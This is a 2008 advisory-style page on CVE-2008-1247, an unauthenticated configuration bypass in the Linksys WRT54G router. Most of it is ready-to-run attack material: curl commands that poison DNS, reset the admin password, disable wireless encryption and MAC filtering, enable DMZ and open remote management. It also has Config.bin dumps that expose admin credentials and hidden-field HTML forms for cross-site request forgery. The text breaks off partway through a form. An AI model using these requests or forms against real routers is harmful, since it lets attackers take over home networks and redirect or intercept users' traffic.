<html><head><title>Linksys WRT54G (firmware 1.00.9) Security Bypass Vulnerabilities</title></head><pre>                                                   regurgitated by: meathive
                                                       url: kinqpinz.info ;]
				             Tue, 05 Feb 2008 07:51:41 -0700
############################################################################
CVE-2008-1247
WRT54G firmware version: v1.00.9
Default LAN IP: 192.168.1.1
Default auth: user:blank - pass:admin
Authorization: Basic OmFkbWlu
php &gt; print base64_decode(&quot;OmFkbWlu&quot;);
:admin
https://kinqpinz.info/lib/wrt54g/
Refer to the above URL for demonstrations!

The official CVE -- http://nvd.nist.gov/nvd.cfm?cvename=CVE-2008-1247 -- entry for these vulnerabilities confirm that although the complexity of these attacks is low, their impact is extremely high.
############################################################################

                        /******************************
			* No Authentication Required! *
			******************************/

############################################################################
What:
poison dns.
dns 1 = 1.2.3.4
dns 2 = 5.6.7.8
dns 3 = 9.8.7.6

Where:
http://192.168.1.1/Basic.tri?dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=1&amp;dns0_1=2&amp;dns0_2=3&amp;dns0_3=4&amp;dns1_0=5&amp;dns1_1=6&amp;dns1_2=7&amp;dns1_3=8&amp;dns2_0=9&amp;dns2_1=8&amp;dns2_2=7&amp;dns2_3=6&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en

How:
curl -d &quot;dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=1&amp;dns0_1=2&amp;dns0_2=3&amp;dns0_3=4&amp;dns1_0=5&amp;dns1_1=6&amp;dns1_2=7&amp;dns1_3=8&amp;dns2_0=9&amp;dns2_1=8&amp;dns2_2=7&amp;dns2_3=6&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en&quot; http://192.168.1.1/Basic.tri
############################################################################
What:
restore factory defaults.

Where:
http://192.168.1.1/factdefa.tri?FactoryDefaults=Yes&amp;layout=en

How:
curl -d &quot;FactoryDefaults=Yes&amp;layout=en&quot; http://192.168.1.1/factdefa.tri
############################################################################
What:
restore basic setup options to default.

Where:
http://192.168.1.1/Basic.tri?dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=0&amp;dns0_1=0&amp;dns0_2=0&amp;dns0_3=0&amp;dns1_0=0&amp;dns1_1=0&amp;dns1_2=0&amp;dns1_3=0&amp;dns2_0=0&amp;dns2_1=0&amp;dns2_2=0&amp;dns2_3=0&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en

How: 
curl -d &quot;dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=0&amp;dns0_1=0&amp;dns0_2=0&amp;dns0_3=0&amp;dns1_0=0&amp;dns1_1=0&amp;dns1_2=0&amp;dns1_3=0&amp;dns2_0=0&amp;dns2_1=0&amp;dns2_2=0&amp;dns2_3=0&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en&quot; http://192.168.1.1/Basic.tri
############################################################################
What: 
reset administrative password to 'asdf'.

Where:
http://192.168.1.1/manage.tri?remote_mgt_https=0&amp;http_enable=1&amp;https_enable=0&amp;PasswdModify=1&amp;http_passwd=asdf&amp;http_passwdConfirm=asdf&amp;_http_enable=1&amp;web_wl_filter=1&amp;remote_management=0&amp;upnp_enable=1&amp;layout=en

How:
curl -d &quot;remote_mgt_https=0&amp;http_enable=1&amp;https_enable=0&amp;PasswdModify=1&amp;http_passwd=asdf&amp;http_passwdConfirm=asdf&amp;_http_enable=1&amp;web_wl_filter=1&amp;remote_management=0&amp;upnp_enable=1&amp;layout=en&quot; http://192.168.1.1/manage.tri
############################################################################
What: 
enable mixed wireless network mode with SSID 'pwnage' on channel 6, SSID broadcasting enabled.

Where:
http://192.168.1.1/WBasic.tri?submit_type=&amp;channelno=11&amp;OldWirelessMode=3&amp;Mode=3&amp;SSID=pwnage&amp;channel=6&amp;Freq=6&amp;wl_closed=1&amp;sesMode=1&amp;layout=en

How: 
curl -d &quot;submit_type=&amp;channelno=11&amp;OldWirelessMode=3&amp;Mode=3&amp;SSID=pwnage&amp;channel=6&amp;Freq=6&amp;wl_closed=1&amp;sesMode=1&amp;layout=en&quot; http://192.168.1.1/WBasic.tri 
############################################################################
What: 
disable all wireless encryption.

Where:
http://192.168.1.1/Security.tri?SecurityMode=0&amp;layout=en

How: 
curl -d &quot;SecurityMode=0&amp;layout=en&quot; http://192.168.1.1/Security.tri
############################################################################
What: 
disable wireless MAC filtering.

Where:
http://192.168.1.1/WFilter.tri?wl_macmode1=0

How: 
curl -d &quot;wl_macmode1=0&quot; http://192.168.1.1/WFilter.tri
############################################################################
What: 
enable DMZ to ip 192.168.1.100.

Where:
http://192.168.1.1/dmz.tri?action=Apply&amp;dmz_enable=1&amp;dmz_ipaddr=100&amp;layout=en

How: 
curl -d &quot;action=Apply&amp;dmz_enable=1&amp;dmz_ipaddr=100&amp;layout=en&quot; http://192.168.1.1/dmz.tri
############################################################################
What: 
disable DMZ.

Where:
http://192.168.1.1/dmz.tri?action=Apply&amp;dmz_enable=0&amp;layout=en

How: 
curl -d &quot;action=Apply&amp;dmz_enable=0&amp;layout=en&quot; http://192.168.1.1/dmz.tri
############################################################################
What: 
enable remote management on port 31337 with password 'asdf', wireless web access and UPnP enabled.

Where:
http://192.168.1.1/manage.tri?remote_mgt_https=0&amp;http_enable=1&amp;https_enable=0&amp;PasswdModify=1&amp;http_passwd=asdf&amp;http_passwdConfirm=asdf&amp;_http_enable=1&amp;web_wl_filter=1&amp;remote_management=1&amp;http_wanport=31337&amp;upnp_enable=1&amp;layout=en

How: 
curl -d &quot;remote_mgt_https=0&amp;http_enable=1&amp;https_enable=0&amp;PasswdModify=1&amp;http_passwd=asdf&amp;http_passwdConfirm=asdf&amp;_http_enable=1&amp;web_wl_filter=1&amp;remote_management=1&amp;http_wanport=31337&amp;upnp_enable=1&amp;layout=en&quot; http://192.168.1.1/manage.tri
############################################################################

                        /******************************
			******      Defaults:    ******
			******************************/
			
############################################################################
Setup-&gt;Basic Setup:
POST /Basic.tri dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=0&amp;dns0_1=0&amp;dns0_2=0&amp;dns0_3=0&amp;dns1_0=0&amp;dns1_1=0&amp;dns1_2=0&amp;dns1_3=0&amp;dns2_0=0&amp;dns2_1=0&amp;dns2_2=0&amp;dns2_3=0&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en
############################################################################
Setup-&gt;DDNS:
POST /ddns.tri ddns_enable=0
############################################################################
Setup-&gt;MAC Address Clone:
POST /WanMac.tri action=Apply&amp;mac_clone_enable=0
############################################################################
Setup-&gt;Advanced Routing:
POST /AdvRoute.tri action=Apply&amp;bSRoute=1&amp;oldOpMode=0&amp;wk_mode=0&amp;route_page=0&amp;route_name=&amp;route_ipaddr_0=0&amp;route_ipaddr_1=0&amp;route_ipaddr_2=0&amp;route_ipaddr_3=0&amp;route_netmask_0=0&amp;route_netmask_1=0&amp;route_netmask_2=0&amp;route_netmask_3=0&amp;route_gateway_0=0&amp;route_gateway_1=0&amp;route_gateway_2=0&amp;route_gateway_3=0&amp;route_ifname=0
############################################################################
Wireless-&gt;Basic Wireless Settings:
POST /WBasic.tri submit_type=&amp;channelno=11&amp;OldWirelessMode=3&amp;Mode=3&amp;SSID=linksys&amp;channel=6&amp;Freq=6&amp;wl_closed=1&amp;sesMode=1&amp;layout=en
############################################################################
Wireless-&gt;Wireless Security:
POST /Security.tri SecurityMode=0&amp;layout=en
############################################################################
Wireless-&gt;Wireless MAC Filter:
POST /WFilter.tri wl_macmode1=0
############################################################################
Wireless-&gt;Advanced Wireless Settings:
POST /Advanced.tri AuthType=0&amp;basicrate=default&amp;wl_rate=0&amp;wMode=3&amp;sectype=0&amp;ctspmode=off&amp;FrameBurst=off&amp;BeaconInterval=100&amp;Dtim=1&amp;FragLen=2346&amp;RTSThre=2347&amp;apisolation=0&amp;apSESmode=1
############################################################################
Security-&gt;Firewall:
POST /fw.tri ident_pass=1&amp;action=Apply&amp;block_wan=1&amp;IGMP=1&amp;_ident_pass=1
############################################################################
Security-&gt;VPN:
POST /vpn.tri action=Apply&amp;ipsec_pass=1&amp;pptp_pass=1&amp;l2tp_pass=1
############################################################################
Access Restrictions-&gt;Internet Access:
POST /filter.tri action=Apply&amp;f_id=0&amp;f_status1=disable&amp;f_name=&amp;f_status2=1&amp;day_all=1&amp;time_all=1&amp;FROM_AMPM=0&amp;TO_AMPM=0&amp;blocked_service0=NONE&amp;blocked_service1=NONE&amp;host0=&amp;host1=&amp;host2=&amp;host3=&amp;url0=&amp;url1=&amp;url2=&amp;url3=&amp;url4=&amp;url5=
############################################################################
Applications &amp; Gaming-&gt;Port Range Forward:
POST /PortRange.tri action=Apply&amp;RuleID_0=0&amp;name0=&amp;from0=0&amp;to0=0&amp;pro0=both&amp;ip0=0&amp;RuleID_1=0&amp;name1=&amp;from1=0&amp;to1=0&amp;pro1=both&amp;ip1=0&amp;RuleID_2=0&amp;name2=&amp;from2=0&amp;to2=0&amp;pro2=both&amp;ip2=0&amp;RuleID_3=0&amp;name3=&amp;from3=0&amp;to3=0&amp;pro3=both&amp;ip3=0&amp;RuleID_4=0&amp;name4=&amp;from4=0&amp;to4=0&amp;pro4=both&amp;ip4=0&amp;RuleID_5=0&amp;name5=&amp;from5=0&amp;to5=0&amp;pro5=both&amp;ip5=0&amp;RuleID_6=0&amp;name6=&amp;from6=0&amp;to6=0&amp;pro6=both&amp;ip6=0&amp;RuleID_7=0&amp;name7=&amp;from7=0&amp;to7=0&amp;pro7=both&amp;ip7=0&amp;RuleID_8=0&amp;name8=&amp;from8=0&amp;to8=0&amp;pro8=both&amp;ip8=0&amp;RuleID_9=0&amp;name9=&amp;from9=0&amp;to9=0&amp;pro9=both&amp;ip9=0
############################################################################
Applications &amp; Gaming-&gt;Port Triggering:
POST /ptrigger.tri RuleID_0=&amp;service_name0=&amp;tfrom0=0&amp;tto0=0&amp;rfrom0=0&amp;rto0=0&amp;RuleID_1=&amp;service_name1=&amp;tfrom1=0&amp;tto1=0&amp;rfrom1=0&amp;rto1=0&amp;RuleID_2=&amp;service_name2=&amp;tfrom2=0&amp;tto2=0&amp;rfrom2=0&amp;rto2=0&amp;RuleID_3=&amp;service_name3=&amp;tfrom3=0&amp;tto3=0&amp;rfrom3=0&amp;rto3=0&amp;RuleID_4=&amp;service_name4=&amp;tfrom4=0&amp;tto4=0&amp;rfrom4=0&amp;rto4=0&amp;RuleID_5=&amp;service_name5=&amp;tfrom5=0&amp;tto5=0&amp;rfrom5=0&amp;rto5=0&amp;RuleID_6=&amp;service_name6=&amp;tfrom6=0&amp;tto6=0&amp;rfrom6=0&amp;rto6=0&amp;RuleID_7=&amp;service_name7=&amp;tfrom7=0&amp;tto7=0&amp;rfrom7=0&amp;rto7=0&amp;RuleID_8=&amp;service_name8=&amp;tfrom8=0&amp;tto8=0&amp;rfrom8=0&amp;rto8=0&amp;RuleID_9=&amp;service_name9=&amp;tfrom9=0&amp;tto9=0&amp;rfrom9=0&amp;rto9=0&amp;trinamelist=&amp;layout=en
############################################################################
Applications &amp; Gaming-&gt;DMZ:
POST /dmz.tri action=Apply&amp;dmz_enable=0&amp;layout=en
############################################################################
Applications &amp; Gaming-&gt;QoS:
POST /qos.tri hport_priority_1=0&amp;hport_priority_2=0&amp;hport_priority_3=0&amp;hport_priority_4=0&amp;hport_flow_control_1=1&amp;hport_flow_control_2=1&amp;hport_flow_control_3=1&amp;hport_flow_control_4=1&amp;happname1=&amp;hport1priority=0&amp;happport1=0&amp;happname2=&amp;hport2priority=0&amp;happport2=0&amp;happname3=&amp;hport3priority=0&amp;happport3=0&amp;happname4=&amp;hport4priority=0&amp;happport4=0&amp;happname5=&amp;hport5priority=0&amp;happport5=0&amp;happname6=&amp;hport6priority=0&amp;happport6=0&amp;happname7=&amp;hport7priority=0&amp;happport7=0&amp;happname8=&amp;hport8priority=0&amp;happport8=0&amp;QoS=0&amp;wl_wme=off&amp;layout=en
############################################################################
Administration-&gt;Management:
POST /manage.tri remote_mgt_https=0&amp;http_enable=1&amp;https_enable=0&amp;PasswdModify=1&amp;http_passwd=d6nw5v1x2pc7st9m&amp;http_passwdConfirm=d6nw5v1x2pc7st9m&amp;_http_enable=1&amp;web_wl_filter=1&amp;remote_management=0&amp;upnp_enable=1&amp;layout=en
############################################################################
Administration-&gt;Log:
POST /ctlog.tri log_enable=0
############################################################################
Administration-&gt;Diagnostics-&gt;Ping:
POST /ping.tri action=start&amp;ping_ip=kinqpinz.info&amp;ping_times=5
############################################################################
Administration-&gt;Diagnostics-&gt;Trace Route:
POST /tracert.tri action=start&amp;traceroute_ip=kinqpinz.info
############################################################################
Administration-&gt;Factory Defaults:
############################################################################
Administration-&gt;Firmware Upgrade:
############################################################################
Administration-&gt;Config Management:
############################################################################
Status-&gt;Router-&gt;DHCP Release:
POST /rstatus.tri action=release&amp;wan_pro=0&amp;conn_stats=4294967295&amp;layout=en
############################################################################
Status-&gt;Router-&gt;DHCP Renew:
POST /rstatus.tri action=renew&amp;wan_pro=0&amp;conn_stats=4294967295&amp;layout=en
############################################################################
Status-&gt;Local Network:
############################################################################
Status-&gt;Wireless:
############################################################################

A couple new things I've found inside the default configuration file, http://192.168.1.1/Config.bin. 
The router uses a military NTP server, ntp2.usno.navy.mil, for synchronizing time. 
The device's virtual memory/file system info is located at /mem/pricf/0, which I'm still exploring. 
The only reference I've found in regards to /mem/pricf/0, by the way, is on a Korean site so it's still relatively new territory. 

By simply viewing the ASCII within Config.bin we can view the administrative user name and password, external and internal IPs, router name, available service configurations, and so on. 

It becomes more interesting when the device is not left in default mode as more information is available pertaining to what is and isn't left on. 

The firmware seems to come from a company named Intoto, http://www.intoto.com/company.shtml.

Here is a dump of Config.bin using the default settings:
############################################################################
TROC
/mem/pricf/0
(c) 2001 Copyright Intoto, Inc
5VGWJ
WRT54G
linksysrouter
self
ntp2.usno.navy.mil
root
00000000000000
mirror0
None
None
httpSharenet
mirror0
httpSharenet
httpSubnet
httpSharenet
httpSubnet
19192.168.1.1
httpSharenet
httpSubnet
PPPOE
PPPOE
PPTP
PPTP
L2TP
L2TP
PPPOE
PPPoE
Med=vl1,AC=,Fr=Sync
PPTP
PPTP
:M-2:I-0.0.0.0:F-2:B-2
L2TP
L2TP
M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
Intoto
IntotoSoft
Intoto
WANIPConn1
WANIPConn1
----
admin
admin
linksys
long
default
langpak_en
PING
TFTP
IMAP
HTTPS
SNMP
NNTP
POP3
SMTP
HTTP
TELNET
RegularNAT1
RegularNAT1
RegularNAT1
RegularNAT1
RegularNAT1
DefaultTcp
DefaultUdp
DefaultIcmp
ftpinac
dnsinac
hainac
gatekeeper
msgudp
tftp
pcanywhere
l2tp
rtsp554
rtsp7070
h323
msgtcp
pptp
n2pe
cuseeme
mszone
CORP
SELF
DefPoly
DefISAKMP
DefPPTP
DefL2TP                                                                                                                 
############################################################################
I should mention that the external IP was available to me when I dumped Config.bin after making some changes in the Web interface. By default, it is not viewable. Here the admin password is 'asdf':
############################################################################
TROC
/mem/pricf/0
(c) 2001 Copyright Intoto, Inc
5VGWJ
WRT54G
linksysrouter
self
ntp2.usno.navy.mil
root
00000000000000
mirror0
None
None
httpSharenet
mirror0
httpSharenet
httpSubnet
httpSharenet
httpSubnet
19192.168.1.1
httpSharenet
httpSubnet
6868.87.85.98;68.87.69.146
httpSharenet
httpSubnet
hshsd1.co.comcast.net.
httpSharenet
httpSubnet
PPPOE
PPPOE
PPTP
PPTP
L2TP
L2TP
PPPOE
PPPoE
Med=vl1,AC=,Fr=Sync
PPTP
PPTP
:M-2:I-0.0.0.0:F-2:B-2
L2TP
L2TP
M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
Intoto
IntotoSoft
Intoto
WANIPConn1
x.x.x.x -- external IP now exists!
WANIPConn1
admin
asdf
linksys
long
default
langpak_en
PING
TFTP
IMAP
HTTPS
SNMP
NNTP
POP3
SMTP
HTTP
TELNET
RegularNAT1
RegularNAT1
RegularNAT1
RegularNAT1
RegularNAT1
DefaultTcp
DefaultUdp
DefaultIcmp
ftpinac
dnsinac
hainac
gatekeeper
msgudp
tftp
pcanywhere
l2tp
rtsp554
rtsp7070
h323
msgtcp
pptp
n2pe
cuseeme
mszone
CORP
SELF
DefPoly
DefISAKMP
DefPPTP
DefL2TP
############################################################################
These remaining entries are all from https://kinqpinz.info/lib/wrt54g/, my demo page, which demonstrate how simple HTML can be crafted to crack the device's security.
############################################################################
Poison DNS: static DNS 1 = 1.2.3.4; static DNS 2 = 5.6.7.8; static DNS 3 = 9.8.7.6:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/Basic.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dhcp_end&quot; value=&quot;149&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;oldMtu&quot; value=&quot;1500&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;oldLanSubnet&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;OldWanMode&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;SDHCP1&quot; value=&quot;192&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;SDHCP2&quot; value=&quot;168&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;SDHCP3&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;SDHCP4&quot; value=&quot;100&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;EDHCP1&quot; value=&quot;192&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;EDHCP2&quot; value=&quot;168&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;EDHCP3&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;EDHCP4&quot; value=&quot;150&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;pd&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;now_proto&quot; value=&quot;dhcp&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;old_domain&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;chg_lanip&quot; value=&quot;192.168.1.1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;_daylight_time&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wan_proto&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;router_name&quot; value=&quot;WRT54G&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wan_hostname&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wan_domain&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;mtu_enable&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;lan_ipaddr_0&quot; value=&quot;192&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;lan_ipaddr_1&quot; value=&quot;168&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;lan_ipaddr_2&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;lan_ipaddr_3&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;lan_netmask&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;lan_proto&quot; value=&quot;Enable&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dhcp_start&quot; value=&quot;100&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dhcp_num&quot; value=&quot;50&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dhcp_lease&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns0_0&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns0_1&quot; value=&quot;2&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns0_2&quot; value=&quot;3&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns0_3&quot; value=&quot;4&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns1_0&quot; value=&quot;5&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns1_1&quot; value=&quot;6&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns1_2&quot; value=&quot;7&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns1_3&quot; value=&quot;8&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns2_0&quot; value=&quot;9&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns2_1&quot; value=&quot;8&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns2_2&quot; value=&quot;7&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dns2_3&quot; value=&quot;6&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wins_0&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wins_1&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wins_2&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wins_3&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;time_zone&quot; value=&quot;%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;daylight_time&quot; value=&quot;ON&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Reset administrative password to 'asdf':

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/manage.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;remote_mgt_https&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;https_enable&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;PasswdModify&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_passwd&quot; value=&quot;asdf&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;http_passwdConfirm&quot; value=&quot;asdf&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;_http_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;web_wl_filter&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;remote_management&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;upnp_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable mixed wireless network mode with SSID 'pwnage' on channel 6, SSID broadcasting enabled:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/WBasic.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;submit_type&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;channelno&quot; value=&quot;11&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;OldWirelessMode&quot; value=&quot;3&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;Mode&quot; value=&quot;3&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;SSID&quot; value=&quot;pwnage&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;channel&quot; value=&quot;6&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;Freq&quot; value=&quot;6&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wl_closed&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;sesMode&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Disable all wireless encryption:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/Security.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;SecurityMode&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;layout&quot; value=&quot;en&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Disable wireless MAC filtering:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/WFilter.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;wl_macmodel&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
############################################################################
Enable DMZ to 192.168.1.100:

&lt;form method=&quot;post&quot; action=&quot;http://192.168.1.1/dmz.tri&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;Apply&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dmz_enable&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;dmz_ipaddr&quot; value=&quot;100&quot;&gt;
